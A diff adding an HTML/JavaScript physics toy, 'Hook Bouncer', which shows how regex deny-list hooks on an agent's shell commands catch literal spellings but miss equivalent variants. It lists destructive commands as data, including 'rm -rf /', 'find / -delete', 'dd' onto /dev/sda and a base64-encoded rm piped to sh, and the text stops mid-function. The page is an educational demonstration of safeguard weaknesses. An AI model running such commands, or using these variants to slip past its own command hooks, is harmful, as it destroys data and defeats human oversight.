@@ -1,0 +1,912 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>Hook Bouncer — pattern hooks catch spelling, not effect</title>
+<meta name="description" content="A Canvas 2D physics toy: shell commands roll toward a door guarded by a pattern-matching pre-tool hook. Obvious ones bounce with a BLOCKED stamp; equivalent-effect variants slip through. Toy simulation — real regex on real strings, no commands execute.">
+<meta property="og:title" content="Hook Bouncer">
+<meta property="og:description" content="Commands roll toward a pattern hook. rm -rf bounces. find . -delete slips through. Toy simulation — spelling, not effect.">
+<meta property="og:image" content="https://blackman99.github.io/curio/hook-bouncer/og.png">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Hook Bouncer">
+<meta name="twitter:description" content="A nightclub door for agent shell commands. Pattern hooks catch the spelling. The variants walk in.">
+<meta name="twitter:image" content="https://blackman99.github.io/curio/hook-bouncer/og.png">
+<link rel="icon" href="../assets/favicon.svg">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Inconsolata:wght@500;700&family=Libre+Baskerville:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
+<style>
+:root{
+  --wall:#1a0a10;--wall2:#2a1018;--velvet:#5c1228;--brass:#d4a84b;--brass2:#8a6a2a;
+  --clip:#f4ecd8;--ink:#1c1410;--stamp:#e0183a;--safe:#2db87a;--chalk:#e8dcc4;
+  --muted:#a89888;--panel:rgba(18,8,12,.92);--line:rgba(212,168,75,.35);
+}
+*{box-sizing:border-box}
+html,body{margin:0;height:100%;background:var(--wall);color:var(--chalk);font-family:'Libre Baskerville',Georgia,serif;overflow:hidden;-webkit-font-smoothing:antialiased;-webkit-tap-highlight-color:transparent}
+button,input{font:inherit;color:inherit}
+button{cursor:pointer}
+.mono{font-family:'Inconsolata',ui-monospace,Menlo,monospace}
+.sign{font-family:'Bebas Neue',Impact,sans-serif;letter-spacing:.04em}
+
+#stage{position:fixed;inset:0;overflow:hidden;background:
+  radial-gradient(70% 60% at 55% 40%,rgba(212,168,75,.07),transparent 65%),
+  radial-gradient(120% 100% at 40% 50%,#2a1018 0%,#1a0a10 55%,#0c0508 100%)}
+#stage::before{content:"";position:absolute;inset:0;opacity:.4;pointer-events:none;background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='200' height='200'><filter id='n'><feTurbulence type='fractalNoise' baseFrequency='.9' numOctaves='2' stitchTiles='stitch'/><feColorMatrix values='0 0 0 0 .4 0 0 0 0 .15 0 0 0 0 .18 0 0 0 .08 0'/></filter><rect width='100%25' height='100%25' filter='url(%23n)'/></svg>")}
+#cv{position:absolute;inset:0;width:100%;height:100%;display:block;touch-action:none;cursor:grab}
+#cv.drag{cursor:grabbing}
+
+#title{position:fixed;left:28px;top:22px;width:300px;z-index:4;pointer-events:none}
+#title .kicker{font:600 11px/1 'Inconsolata',monospace;letter-spacing:.28em;color:var(--brass);text-transform:uppercase;margin:0 0 6px}
+#title h1{font-family:'Bebas Neue',Impact,sans-serif;font-weight:400;font-size:54px;line:.9;letter-spacing:.02em;margin:0;color:var(--chalk);text-shadow:0 2px 0 #0a0406}
+#title h1 span{color:var(--stamp)}
+#title p{margin:10px 0 0;font:400 13px/1.45 'Libre Baskerville',serif;color:var(--muted);max-width:280px}
+
+#caption{position:fixed;left:28px;bottom:28px;width:320px;z-index:4;pointer-events:none;
+  font:400 14px/1.4 'Libre Baskerville',serif;color:var(--chalk);
+  background:linear-gradient(90deg,rgba(26,10,16,.85),transparent);padding:10px 14px 10px 0;
+  opacity:0;transition:opacity .35s}
+#caption.on{opacity:1}
+#caption b{color:var(--brass);font-weight:700}
+
+#panel{position:fixed;right:18px;top:18px;bottom:18px;width:340px;z-index:5;display:flex;flex-direction:column;gap:10px;
+  background:var(--panel);border:1px solid var(--line);border-radius:4px;
+  box-shadow:0 20px 60px rgba(0,0,0,.55),inset 0 1px 0 rgba(212,168,75,.12);padding:14px 14px 12px;overflow:auto;scrollbar-width:thin}
+.clip{background:var(--clip);color:var(--ink);border-radius:2px;padding:12px 14px 14px;
+  box-shadow:2px 3px 0 rgba(0,0,0,.35),inset 0 0 0 1px rgba(140,100,40,.15);
+  background-image:repeating-linear-gradient(transparent,transparent 27px,rgba(140,100,40,.18) 27px,rgba(140,100,40,.18) 28px);
+  background-position:0 36px}
+.clip .hdr{font:700 10px/1 'Inconsolata',monospace;letter-spacing:.22em;color:#6a5030;text-transform:uppercase;margin:0 0 8px;display:flex;justify-content:space-between;align-items:center}
+.clip .hdr .badge{background:var(--brass);color:#1a0a10;padding:2px 6px;border-radius:2px;letter-spacing:.1em;font-size:9px}
+.clip .rule{font:700 13px/1.35 'Inconsolata',monospace;color:#8b1a2a;word-break:break-all;margin:0 0 6px;background:rgba(224,24,58,.08);padding:6px 8px;border-left:3px solid var(--stamp)}
+.clip .rule.allow{color:#1a5c40;border-left-color:var(--safe);background:rgba(45,184,122,.1)}
+.clip .note{font:italic 12px/1.4 'Libre Baskerville',serif;color:#4a3a28;margin:8px 0 0}
+
+.tally{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.tally .box{background:rgba(0,0,0,.35);border:1px solid var(--line);border-radius:3px;padding:10px 12px;text-align:center}
+.tally .box .n{font-family:'Bebas Neue',Impact,sans-serif;font-size:42px;line:1;color:var(--chalk)}
+.tally .box.blk .n{color:var(--stamp)}
+.tally .box.slp .n{color:var(--safe)}
+.tally .box .l{font:700 10px/1 'Inconsolata',monospace;letter-spacing:.18em;color:var(--muted);margin-top:2px;text-transform:uppercase}
+
+.sect{font:700 10px/1 'Inconsolata',monospace;letter-spacing:.2em;color:var(--brass);text-transform:uppercase;margin:4px 0 2px}
+.chips{display:flex;flex-wrap:wrap;gap:6px}
+.chip{appearance:none;border:1px solid var(--line);background:rgba(0,0,0,.3);color:var(--chalk);
+  font:700 11px/1 'Inconsolata',monospace;letter-spacing:.04em;padding:7px 10px;border-radius:3px;transition:background .15s,border-color .15s,color .15s}
+.chip:hover{border-color:var(--brass);color:var(--brass)}
+.chip.on{background:rgba(212,168,75,.18);border-color:var(--brass);color:var(--brass)}
+.chip.mode.on{background:rgba(45,184,122,.18);border-color:var(--safe);color:var(--safe)}
+.chip.danger.on{background:rgba(224,24,58,.2);border-color:var(--stamp);color:#ff6a7a}
+
+.drop{display:flex;gap:6px;margin-top:2px}
+.drop input{flex:1;min-width:0;background:rgba(0,0,0,.4);border:1px solid var(--line);border-radius:3px;
+  padding:8px 10px;font:700 12px/1.2 'Inconsolata',monospace;color:var(--chalk)}
+.drop input:focus{outline:none;border-color:var(--brass)}
+.drop button,.btn{appearance:none;border:1px solid var(--brass);background:linear-gradient(180deg,#e0b85a,#b88930);
+  color:#1a0a10;font:700 12px/1 'Bebas Neue',Impact,sans-serif;letter-spacing:.12em;padding:9px 14px;border-radius:3px;
+  box-shadow:0 2px 0 #6a4a18,inset 0 1px 0 rgba(255,255,255,.35)}
+.drop button:hover,.btn:hover{filter:brightness(1.08)}
+.drop button:active,.btn:active{transform:translateY(1px);box-shadow:0 1px 0 #6a4a18}
+
+.row{display:flex;gap:6px;flex-wrap:wrap}
+.row .btn.ghost{background:transparent;color:var(--brass);box-shadow:none;border-color:var(--line)}
+.row .btn.ghost:hover{border-color:var(--brass)}
+
+.foot{margin-top:auto;padding-top:8px;font:400 11px/1.45 'Libre Baskerville',serif;color:var(--muted);border-top:1px solid var(--line)}
+.foot a{color:var(--brass);text-decoration:none}
+.foot a:hover{text-decoration:underline}
+.foot b{color:var(--chalk);font-weight:700}
+
+#ghost{position:fixed;width:18px;height:18px;border-radius:50%;border:2px solid var(--brass);background:rgba(212,168,75,.25);
+  box-shadow:0 0 0 4px rgba(212,168,75,.12);pointer-events:none;z-index:6;transform:translate(-50%,-50%);opacity:0;transition:opacity .2s}
+#ghost.on{opacity:1}
+#ghost::after{content:"AUTOPILOT";position:absolute;left:22px;top:-2px;font:700 9px/1 'Inconsolata',monospace;letter-spacing:.12em;color:var(--brass);white-space:nowrap}
+
+@media (max-width:900px){
+  #panel{position:fixed;right:0;left:0;top:auto;bottom:0;width:100%;height:42%;border-radius:12px 12px 0 0;padding-bottom:calc(12px + env(safe-area-inset-bottom))}
+  #title{left:16px;top:12px;width:auto;right:16px}
+  #title h1{font-size:36px}
+  #title p{display:none}
+  #caption{left:16px;bottom:calc(42% + 12px);width:auto;right:16px;font-size:13px}
+}
+@media (prefers-reduced-motion:reduce){
+  #caption{transition:none}#ghost{transition:none}
+}
+</style>
+</head>
+<body>
+<div id="stage">
+  <canvas id="cv"></canvas>
+</div>
+<div id="title">
+  <div class="kicker">Curio No. 018 · Agent hooks</div>
+  <h1>HOOK <span>BOUNCER</span></h1>
+  <p>Shell commands roll toward a door guarded by a pattern-matching pre-tool hook. Spelling gets stopped. Effect walks in.</p>
+</div>
+<div id="caption"></div>
+<div id="ghost" aria-hidden="true"></div>
+
+<aside id="panel">
+  <div class="clip">
+    <div class="hdr"><span>Door policy · clipboard</span><span class="badge" id="modeBadge">DENY LIST</span></div>
+    <div class="rule" id="ruleView">/rm\s+-rf/<br>/git\s+push\s+--force/</div>
+    <p class="note" id="ruleNote">Matches the literal spelling. Equivalent-effect variants are not on this clipboard.</p>
+  </div>
+
+  <div class="tally">
+    <div class="box blk"><div class="n" id="nBlk">0</div><div class="l">Blocked</div></div>
+    <div class="box slp"><div class="n" id="nSlp">0</div><div class="l">Slipped in</div></div>
+  </div>
+
+  <div class="sect">Tighten the rule</div>
+  <div class="chips" id="extraChips">
+    <button class="chip" data-k="split" title="Catch rm -r -f and flag-order swaps">rm flag-split</button>
+    <button class="chip" data-k="find" title="Catch find … -delete">find -delete</button>
+    <button class="chip" data-k="gitf" title="Catch git … push -f / +ref">git -f / +ref</button>
+    <button class="chip" data-k="b64" title="Catch base64 -d | sh style pipes">base64 -d</button>
+  </div>
+  <div class="chips" style="margin-top:2px">
+    <button class="chip mode" id="allowBtn" title="Only a short allowlist of read-only commands may pass">Allowlist mode</button>
+    <button class="chip danger" id="resetBtn">Clear floor</button>
+  </div>
+
+  <div class="sect">Drop a command</div>
+  <div class="drop">
+    <input id="cmdIn" class="mono" spellcheck="false" autocomplete="off" placeholder="type a shell command…">
+    <button id="dropBtn" type="button">DROP</button>
+  </div>
+  <div class="row" style="margin-top:4px">
+    <button class="btn ghost" data-cmd="rm -rf /">rm -rf /</button>
+    <button class="btn ghost" data-cmd="find / -delete">find -delete</button>
+    <button class="btn ghost" data-cmd="git -C ../r push -f">git -C … -f</button>
+    <button class="btn ghost" data-cmd="ls -la">ls -la</button>
+  </div>
+
+  <div class="foot">
+    <b>Toy simulation.</b> Matching is a real regex run in your browser on the real command strings. No commands execute. Fully client-side · no API keys.
+    Drag a block to throw it. · <a href="../">← Curio</a>
+  </div>
+</aside>
+
+<script src="./matter.min.js"></script>
+<script type="module">
+const $=s=>document.querySelector(s);
+const RM=matchMedia('(prefers-reduced-motion: reduce)').matches;
+const Q=new URLSearchParams(location.search);
+const FIXED=Q.has('fixed');
+const STILL=Q.has('still');
+const DEFAULT_SEED=7;
+let SEED=DEFAULT_SEED;
+if(Q.has('seed'))SEED=(parseInt(Q.get('seed'))>>>0)||DEFAULT_SEED;
+else if(FIXED)SEED=7;
+
+/* ---------- seeded RNG ---------- */
+function mulberry32(a){return function(){let t=a+=0x6D2B79F5;t=Math.imul(t^t>>>15,t|1);t^=t+Math.imul(t^t>>>7,t|61);return((t^t>>>14)>>>0)/4294967296}}
+let rng=mulberry32(SEED);
+const rnd=(a=0,b=1)=>a+rng()*(b-a);
+const rint=(a,b)=>a+Math.floor(rng()*(b-a+1));
+
+/* ---------- rule engine (real regex on real strings) ---------- */
+const BASE=[
+  {id:'rmrf', re:/rm\s+-rf/, label:'rm -rf'},
+  {id:'force', re:/git\s+push\s+--force/, label:'git push --force'},
+];
+const EXTRA={
+  split:{re:/\brm\s+(?:-\w+\s+)*-[a-z]*r[a-z]*(?:\s+-\w+)*\s+-[a-z]*f|\brm\s+(?:-\w+\s+)*-[a-z]*f[a-z]*(?:\s+-\w+)*\s+-[a-z]*r/, label:'rm flag-split'},
+  find:{re:/\bfind\b[\s\S]*?\s-delete\b/, label:'find -delete'},
+  gitf:{re:/\bgit\b[\s\S]*?\bpush\b[\s\S]*?(?:\s-f\b|\s\+\S)/, label:'git -f / +ref'},
+  b64:{re:/\bbase64\s+(?:-d|--decode)\b/, label:'base64 -d'},
+};
+const ALLOW=/^(?:ls|pwd|cat|head|tail|grep|git (?:status|diff|log)|npm (?:test|run build))\b(?!.*[;&|`$<>])/;
+
+const ST={
+  extras:new Set(),
+  allow:false,
+  blocked:0,
+  slipped:0,
+  safeIn:0,
+  total:0,
+  stamps:[],
+  confetti:[],
+};
+function activePats(){
+  const p=BASE.map(b=>b.re);
+  for(const k of ST.extras)if(EXTRA[k])p.push(EXTRA[k].re);
+  return p;
+}
+function verdict(cmd){
+  if(ST.allow){
+    const ok=ALLOW.test(cmd.trim());
+    return{blocked:!ok, reason:ok?'allowlist':'not on allowlist', mode:'allow'};
+  }
+  const pats=activePats();
+  for(const re of pats){
+    if(re.test(cmd))return{blocked:true, reason:re.source, mode:'deny'};
+  }
+  return{blocked:false, reason:'no pattern matched', mode:'deny'};
+}
+function ruleText(){
+  if(ST.allow)return'ALLOW only:\nls · pwd · cat · head · tail · grep\ngit status|diff|log · npm test|run build\n(no pipes, redirects, or ; & `| `)';
+  const lines=['/rm\\s+-rf/','/git\\s+push\\s+--force/'];
+  for(const k of ST.extras)if(EXTRA[k])lines.push('/'+EXTRA[k].re.source+'/');
+  return lines.join('\n');
+}
+function refreshRule(){
+  const el=$('#ruleView'), note=$('#ruleNote'), badge=$('#modeBadge');
+  if(ST.allow){
+    el.classList.add('allow');
+    el.textContent=ruleText();
+    note.textContent='Anything not on the short allowlist is refused at the door — including unknown-but-harmless commands.';
+    badge.textContent='ALLOW LIST';
+  }else{
+    el.classList.remove('allow');
+    el.innerHTML=ruleText().split('\n').map(s=>s.replace(/</g,'&lt;')).join('<br>');
+    const n=ST.extras.size;
+    note.textContent=n
+      ?`Base patterns plus ${n} extra${n>1?'s':''}. Tighten further — some equivalents still leak.`
+      :'Matches the literal spelling. Equivalent-effect variants are not on this clipboard.';
+    badge.textContent='DENY LIST';
+  }
+  $('#nBlk').textContent=ST.blocked;
+  $('#nSlp').textContent=ST.slipped;
+}
+
+/* ---------- deck: dangerous vs safe ---------- */
+const DECK=[
+  {cmd:'rm -rf /', danger:true, tag:'classic'},
+  {cmd:'rm -rf ~', danger:true, tag:'classic'},
+  {cmd:'git push --force', danger:true, tag:'classic'},
+  {cmd:'rm -r -f /', danger:true, tag:'variant'},
+  {cmd:'find / -delete', danger:true, tag:'variant'},
+  {cmd:'git -C ../repo push -f', danger:true, tag:'variant'},
+  {cmd:'echo cm0gLXJmIC8= | base64 -d | sh', danger:true, tag:'variant'},
+  {cmd:"perl -e 'unlink glob \"*\"'", danger:true, tag:'variant'},
+  {cmd:'dd if=/dev/zero of=/dev/sda', danger:true, tag:'variant'},
+  {cmd:'git push origin +main', danger:true, tag:'variant'},
+  {cmd:'ls -la', danger:false, tag:'safe'},
+  {cmd:'git status', danger:false, tag:'safe'},
+  {cmd:'npm test', danger:false, tag:'safe'},
+  {cmd:'cat README.md', danger:false, tag:'safe'},
+  {cmd:'grep -r TODO src', danger:false, tag:'safe'},
+];
+
+/* ---------- Matter world ---------- */
+const {Engine, World, Bodies, Body, Events, Query, Mouse, MouseConstraint, Composite}=Matter;
+const engine=Engine.create({gravity:{x:0.7, y:0.55}});
+const world=engine.world;
+engine.timing.timeScale=RM?0.55:1;
+
+const cv=$('#cv'), ctx=cv.getContext('2d');
+let W=0,H=0,DPR=1;
+const layout={doorX:0, doorY:0, doorH:0, floorY:0, chuteX:0, chuteY:0, damageX:0};
+
+function resize(){
+  DPR=Math.min(2, window.devicePixelRatio||1);
+  W=cv.clientWidth||window.innerWidth;
+  H=cv.clientHeight||window.innerHeight;
+  cv.width=Math.floor(W*DPR); cv.height=Math.floor(H*DPR);
+  ctx.setTransform(DPR,0,0,DPR,0,0);
+  // scene geometry (leave room for panel on desktop)
+  const panelW=window.innerWidth>900?360:0;
+  const sceneW=W-panelW;
+  layout.doorX=sceneW*0.58;
+  layout.doorY=H*0.22;
+  layout.doorH=H*0.52;
+  layout.floorY=H*0.86;
+  layout.chuteX=sceneW*0.14;
+  layout.chuteY=H*0.12;
+  layout.damageX=sceneW*0.78;
+  rebuildStatics();
+}
+let walls=[];
+function rebuildStatics(){
+  for(const b of walls)World.remove(world,b);
+  walls=[];
+  const thick=40;
+  // floor under damage + approach
+  const floor=Bodies.rectangle(W/2, layout.floorY+thick/2, W*2, thick, {isStatic:true, friction:0.25, label:'floor',
+    render:{visible:false}, collisionFilter:{category:0x0001, mask:0xffff}});
+  // left wall
+  const left=Bodies.rectangle(-thick/2, H/2, thick, H*2, {isStatic:true, label:'wall'});
+  // ceiling
+  const ceil=Bodies.rectangle(W/2, -thick/2, W*2, thick, {isStatic:true, label:'wall'});
+  // door posts (top and bottom of doorway leave a gap — the "bouncer" is logic, not a solid wall)
+  const postW=18;
+  const topPost=Bodies.rectangle(layout.doorX, layout.doorY-20, postW, 40, {isStatic:true, label:'post', friction:0.4});
+  const botPost=Bodies.rectangle(layout.doorX, layout.doorY+layout.doorH+20, postW, 40, {isStatic:true, label:'post', friction:0.4});
+  // velvet rope rail as soft bumper before door (low restitution shelf)
+  const rope=Bodies.rectangle(layout.doorX-70, layout.floorY-8, 100, 16, {isStatic:true, isSensor:true, label:'rope', chamfer:{radius:6}});
+  // damage bin floor lip
+  const lip=Bodies.rectangle(layout.damageX+40, layout.floorY-6, 160, 12, {isStatic:true, label:'lip', friction:1});
+  // soft baffle under the title so blocks stay in the playfield
+  const baffle=Bodies.rectangle(layout.chuteX+40, 70, 220, 16, {isStatic:true, label:'baffle', friction:0.2, restitution:0.2});
+  walls=[floor,left,ceil,topPost,botPost,rope,lip,baffle];
+  World.add(world, walls);
+}
+resize();
+addEventListener('resize', ()=>{resize();});
+
+/* ---------- command bodies ---------- */
+const cmds=[]; // {body, cmd, danger, state:'air'|'blocked'|'slipped'|'safe', stampT, w, h}
+function measure(cmd){
+  ctx.save();
+  ctx.font='700 13px Inconsolata, ui-monospace, Menlo, monospace';
+  const tw=ctx.measureText(cmd).width;
+  ctx.restore();
+  const padX=14, padY=10;
+  return{w:Math.min(280, Math.max(90, tw+padX*2)), h:34};
+}
+function spawn(cmd, opts={}){
+  const {w,h}=measure(cmd);
+  const x=opts.x??(layout.chuteX+rnd(-20,40));
+  const y=opts.y??(layout.chuteY+rnd(-10,30));
+  const danger=opts.danger??(DECK.find(d=>d.cmd===cmd)?.danger??true);
+  const body=Bodies.rectangle(x,y,w,h,{
+    chamfer:{radius:4},
+    friction:0.15, frictionAir:0.006, restitution:0.4,
+    density:0.0018,
+    label:'cmd',
+    collisionFilter:{category:0x0002, mask:0xffff},
+  });
+  Body.setVelocity(body,{x:opts.vx??rnd(3.8,5.2), y:opts.vy??rnd(-1.2,0.2)});
+  Body.setAngularVelocity(body, opts.w??rnd(-0.08,0.08));
+  const rec={body, cmd, danger, state:'air', stampT:0, w, h, born:T0, id:ST.total++};
+  body.plugin={rec};
+  World.add(world, body);
+  cmds.push(rec);
+  return rec;
+}
+
+/* ---------- door judgment each tick ---------- */
+function judge(){
+  const doorX=layout.doorX;
+  for(const c of cmds){
+    if(c.state!=='air')continue;
+    const b=c.body;
+    // crossing the door plane from left
+    if(b.position.x+c.w*0.3 >= doorX-8 && b.position.x-c.w*0.45 < doorX+40
+       && b.position.y > layout.doorY-10 && b.position.y < layout.doorY+layout.doorH+30){
+      const v=verdict(c.cmd);
+      if(v.blocked){
+        c.state='blocked';
+        ST.blocked++;
+        // bounce hard left + up
+        Body.setVelocity(b,{x: -Math.abs(b.velocity.x)*0.25 - rnd(4.5,6.2), y: -rnd(1.2,2.8)});
+        Body.setAngularVelocity(b, rnd(-0.25,0.25));
+        c.stampT=0.55;
+        ST.stamps.push({x:doorX-10, y:b.position.y, t:0, life:0.9, cmd:c.cmd});
+        // dust
+        for(let i=0;i<8;i++)ST.confetti.push({x:doorX, y:b.position.y, vx:rnd(-4,-1), vy:rnd(-3,1), life:rnd(0.3,0.7), c:'#d4a84b'});
+      }else{
+        c.state=c.danger?'slipped':'safe';
+        if(c.danger)ST.slipped++; else ST.safeIn++;
+        // nudge into the room
+        Body.setVelocity(b,{x: Math.max(2.2, b.velocity.x*0.6+1.2), y:b.velocity.y*0.5});
+        for(let i=0;i<6;i++)ST.confetti.push({x:doorX+20, y:b.position.y, vx:rnd(1,4), vy:rnd(-2,2), life:rnd(0.25,0.55), c:c.danger?'#2db87a':'#a89888'});
+      }
+      refreshRule();
+    }
+  }
+}
+
+/* ---------- drawing ---------- */
+function roundRect(x,y,w,h,r){
+  ctx.beginPath();
+  ctx.moveTo(x+r,y); ctx.arcTo(x+w,y,x+w,y+h,r); ctx.arcTo(x+w,y+h,x,y+h,r);
+  ctx.arcTo(x,y+h,x,y,r); ctx.arcTo(x,y,x+w,y,r); ctx.closePath();
+}
+function drawScene(){
+  ctx.clearRect(0,0,W,H);
+  const panelW=window.innerWidth>900?360:0;
+  const sceneW=W-panelW;
+
+  // floorboards
+  ctx.fillStyle='#12080c';
+  ctx.fillRect(0, layout.floorY, sceneW, H-layout.floorY);
+  ctx.strokeStyle='rgba(212,168,75,.08)';
+  ctx.lineWidth=1;
+  for(let x=0;x<sceneW;x+=28){ctx.beginPath();ctx.moveTo(x,layout.floorY);ctx.lineTo(x,H);ctx.stroke()}
+  for(let y=layout.floorY;y<H;y+=14){ctx.beginPath();ctx.moveTo(0,y);ctx.lineTo(sceneW,y);ctx.stroke()}
+
+  // velvet carpet runner
+  const runY=layout.floorY-6;
+  const grad=ctx.createLinearGradient(layout.chuteX-40,0,layout.doorX,0);
+  grad.addColorStop(0,'#3a0c18'); grad.addColorStop(1,'#5c1228');
+  ctx.fillStyle=grad;
+  roundRect(layout.chuteX-50, runY-10, layout.doorX-(layout.chuteX-50)+20, 20, 4);
+  ctx.fill();
+  // brass edge nails
+  ctx.fillStyle='#d4a84b';
+  for(let x=layout.chuteX-30;x<layout.doorX;x+=36){
+    ctx.beginPath();ctx.arc(x, runY, 2.2, 0, Math.PI*2);ctx.fill();
+  }
+
+  // chute / ticket window
+  ctx.save();
+  ctx.translate(layout.chuteX-30, layout.chuteY-30);
+  ctx.fillStyle='#2a141c';
+  roundRect(0,0,70,50,4); ctx.fill();
+  ctx.strokeStyle='#d4a84b'; ctx.lineWidth=2; roundRect(0,0,70,50,4); ctx.stroke();
+  ctx.fillStyle='#d4a84b';
+  ctx.font='400 14px Bebas Neue, Impact, sans-serif';
+  ctx.fillText('DROP', 14, 22);
+  ctx.font='700 9px Inconsolata, monospace';
+  ctx.fillStyle='#a89888';
+  ctx.fillText('SLOT', 20, 38);
+  ctx.restore();
+
+  // door frame (brass nightclub)
+  const dx=layout.doorX, dy=layout.doorY, dh=layout.doorH, dw=70;
+  // wall around door
+  ctx.fillStyle='#14060c';
+  ctx.fillRect(dx-8, dy-40, dw+50, 36);
+  ctx.fillRect(dx-8, dy+dh+4, dw+50, 50);
+  // brass frame
+  const brassGrad=ctx.createLinearGradient(dx,dy,dx+dw,dy);
+  brassGrad.addColorStop(0,'#8a6a2a'); brassGrad.addColorStop(0.4,'#e8c56a'); brassGrad.addColorStop(1,'#a07830');
+  ctx.fillStyle=brassGrad;
+  // left jamb
+  ctx.fillRect(dx-10, dy-8, 14, dh+16);
+  // right jamb
+  ctx.fillRect(dx+dw-4, dy-8, 14, dh+16);
+  // lintel
+  ctx.fillRect(dx-14, dy-18, dw+28, 16);
+  // threshold
+  ctx.fillRect(dx-14, dy+dh, dw+28, 10);
+
+  // dark doorway (club interior)
+  const doorGrad=ctx.createLinearGradient(dx,dy,dx,dy+dh);
+  doorGrad.addColorStop(0,'#0a0408'); doorGrad.addColorStop(0.5,'#1a0810'); doorGrad.addColorStop(1,'#0c060a');
+  ctx.fillStyle=doorGrad;
+  ctx.fillRect(dx+4, dy, dw-8, dh);
+
+  // neon "NO ENTRY" / "PRIVATE" sign above
+  ctx.save();
+  ctx.shadowColor='#e0183a'; ctx.shadowBlur=RM?0:12;
+  ctx.fillStyle='#e0183a';
+  ctx.font='400 22px Bebas Neue, Impact, sans-serif';
+  ctx.textAlign='center';
+  ctx.fillText('PRIVATE', dx+dw/2, dy-48);
+  ctx.restore();
+  ctx.textAlign='left';
+
+  // bouncer silhouette in doorway
+  drawBouncer(dx+dw*0.55, dy+dh*0.72, dh*0.55);
+
+  // velvet rope posts
+  drawRopePost(layout.doorX-90, layout.floorY);
+  drawRopePost(layout.doorX-30, layout.floorY);
+  // rope curve
+  ctx.strokeStyle='#5c1228'; ctx.lineWidth=5;
+  ctx.beginPath();
+  ctx.moveTo(layout.doorX-90, layout.floorY-38);
+  ctx.quadraticCurveTo(layout.doorX-60, layout.floorY-18, layout.doorX-30, layout.floorY-38);
+  ctx.stroke();
+  ctx.strokeStyle='#d4a84b'; ctx.lineWidth=1.5;
+  ctx.beginPath();
+  ctx.moveTo(layout.doorX-90, layout.floorY-38);
+  ctx.quadraticCurveTo(layout.doorX-60, layout.floorY-18, layout.doorX-30, layout.floorY-38);
+  ctx.stroke();
+
+  // DAMAGE zone sign
+  ctx.save();
+  ctx.translate(layout.damageX+20, layout.floorY-70);
+  ctx.fillStyle='rgba(45,184,122,.12)';
+  roundRect(-10,-28,150,50,4); ctx.fill();
+  ctx.strokeStyle='#2db87a'; ctx.lineWidth=1.5; roundRect(-10,-28,150,50,4); ctx.stroke();
+  ctx.fillStyle='#2db87a';
+  ctx.font='400 20px Bebas Neue, Impact, sans-serif';
+  ctx.fillText('DAMAGE FLOOR', 0, -6);
+  ctx.font='700 10px Inconsolata, monospace';
+  ctx.fillStyle='#a89888';
+  ctx.fillText('slipped past the hook', 0, 12);
+  ctx.restore();
+
+  // clipboard rule echo on wall (small)
+  ctx.save();
+  ctx.globalAlpha=0.55;
+  ctx.fillStyle='#f4ecd8';
+  roundRect(dx-120, dy+20, 95, 70, 2); ctx.fill();
+  ctx.fillStyle='#8b1a2a';
+  ctx.font='700 8px Inconsolata, monospace';
+  const lines=ruleText().split('\n').slice(0,4);
+  lines.forEach((ln,i)=>ctx.fillText(ln.slice(0,18), dx-112, dy+38+i*12));
+  ctx.restore();
+}
+function drawRopePost(x, floorY){
+  ctx.fillStyle='#d4a84b';
+  ctx.fillRect(x-3, floorY-42, 6, 42);
+  ctx.beginPath(); ctx.arc(x, floorY-42, 7, 0, Math.PI*2); ctx.fill();
+  ctx.fillStyle='#8a6a2a';
+  ctx.beginPath(); ctx.ellipse(x, floorY-1, 10, 3, 0, 0, Math.PI*2); ctx.fill();
+}
+function drawBouncer(x, y, h){
+  ctx.save();
+  ctx.translate(x,y);
+  const s=h/120;
+  ctx.scale(s,s);
+  // suit body — charcoal with subtle brass buttons so it reads on dark doorway
+  ctx.fillStyle='#1c1218';
+  roundRect(-24,-72,48,74,6); ctx.fill();
+  ctx.fillStyle='#2a1a22';
+  ctx.fillRect(-34,-70,68,20); // shoulders
+  // shirt V
+  ctx.fillStyle='#e8dcc4';
+  ctx.beginPath(); ctx.moveTo(0,-70); ctx.lineTo(-10,-40); ctx.lineTo(10,-40); ctx.closePath(); ctx.fill();
+  // head
+  ctx.fillStyle='#2a1c18';
+  ctx.beginPath(); ctx.arc(0,-90,17,0,Math.PI*2); ctx.fill();
+  // sunglasses
+  ctx.fillStyle='#0a0406';
+  roundRect(-12,-94,24,8,2); ctx.fill();
+  // arms crossed
+  ctx.strokeStyle='#24141c'; ctx.lineWidth=11; ctx.lineCap='round';
+  ctx.beginPath(); ctx.moveTo(-30,-52); ctx.lineTo(22,-36); ctx.stroke();
+  ctx.beginPath(); ctx.moveTo(30,-52); ctx.lineTo(-22,-36); ctx.stroke();
+  // earpiece LED
+  ctx.fillStyle='#e0183a';
+  ctx.shadowColor='#e0183a'; ctx.shadowBlur=RM?0:8;
+  ctx.beginPath(); ctx.arc(15,-92,3.5,0,Math.PI*2); ctx.fill();
+  ctx.shadowBlur=0;
+  // clipboard
+  ctx.fillStyle='#f4ecd8';
+  ctx.save(); ctx.translate(-34,-32); ctx.rotate(-0.28);
+  ctx.fillRect(0,0,24,30);
+  ctx.fillStyle='#d4a84b'; ctx.fillRect(8,-3,8,5);
+  ctx.fillStyle='#8b1a2a';
+  ctx.fillRect(3,7,18,2.5); ctx.fillRect(3,13,14,2.5); ctx.fillRect(3,19,16,2.5);
+  ctx.restore();
+  ctx.restore();
+}
+function drawCmd(c){
+  const b=c.body;
+  const {x,y}=b.position;
+  const ang=b.angle;
+  ctx.save();
+  ctx.translate(x,y); ctx.rotate(ang);
+  // block body
+  let bg='#e8dcc4', ink='#1c1410', edge='#8a6a2a';
+  if(c.state==='blocked'){bg='#3a1018'; ink='#ffb0b8'; edge='#e0183a'}
+  else if(c.state==='slipped'){bg='#143028'; ink='#b8ffe0'; edge='#2db87a'}
+  else if(c.state==='safe'){bg='#2a2830'; ink='#c8c0b0'; edge='#6a6050'}
+  else if(c.danger){bg='#f0e2c4'; ink='#1c1410'; edge='#a07830'}
+  else{bg='#d8e0d4'; ink='#1c1410'; edge='#4a6a50'}
+
+  ctx.shadowColor='rgba(0,0,0,.45)'; ctx.shadowBlur=RM?0:8; ctx.shadowOffsetY=3;
+  ctx.fillStyle=bg;
